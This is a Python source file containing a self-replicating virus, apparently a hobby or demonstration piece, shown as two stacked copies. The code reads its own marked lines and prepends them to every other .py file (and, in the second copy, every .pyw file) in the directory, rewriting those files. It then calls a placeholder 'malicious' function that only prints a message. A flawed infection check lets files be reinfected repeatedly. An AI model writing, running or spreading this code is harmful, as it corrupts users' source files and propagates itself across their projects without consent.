# Virus code pypy

import sys
import glob

virus_lines = []

with open(sys.argv[0], "r") as f:
    code_lines = f.readlines()
    replicating_part = False
    for line in code_lines:
        if line.strip() == "# Virus code pypy":
            replicating_part = True
        if replicating_part:
            virus_lines.append(line)
        if line.strip() == "# Virus end":
            print("Ending")
            break


files = glob.glob('*.py')

for file in files:
    if file != sys.argv[0]:    
        is_infected = False
        file_code = []
        final_code = []
        with open(file, "r") as f:
            file_code = f.readlines()
            f.close()
        for line in file_code:
            if line == "# Virus code pypy":
                is_infected = True
                break
        if not is_infected:
            final_code.extend(virus_lines)
            final_code.append("\n")
            final_code.extend(file_code)
        with open(file, "w") as f:
            f.writelines(final_code)

def malicious_code():
    print("This shall do something malicious... hehehe")

malicious_code()
# Virus end
# Virus code pypy

import sys
import glob

virus_lines = []

with open(sys.argv[0], "r") as f:
    code_lines = f.readlines()
    replicating_part = False
    for line in code_lines:
        if line.strip() == "# Virus code pypy":
            replicating_part = True
        if replicating_part:
            virus_lines.append(line)
        if line.strip() == "# Virus end":
            print("Ending")
            break

print(virus_lines)
files = glob.glob('*.py') + glob.glob('*.pyw')

for file in files:
    if file != sys.argv[0]:    
        is_infected = False
        file_code = []
        final_code = []
        with open(file, "r") as f:
            file_code = f.readlines()
            f.close()
        for line in file_code:
            if line == "# Virus code pypy":
                is_infected = True
                break
        if not is_infected:
            final_code.extend(virus_lines)
            final_code.append("\n")
            final_code.extend(file_code)
        with open(file, "w") as f:
            f.writelines(final_code)

def malicious_code():
    print("You have been infected!!")

malicious_code()
# Virus end
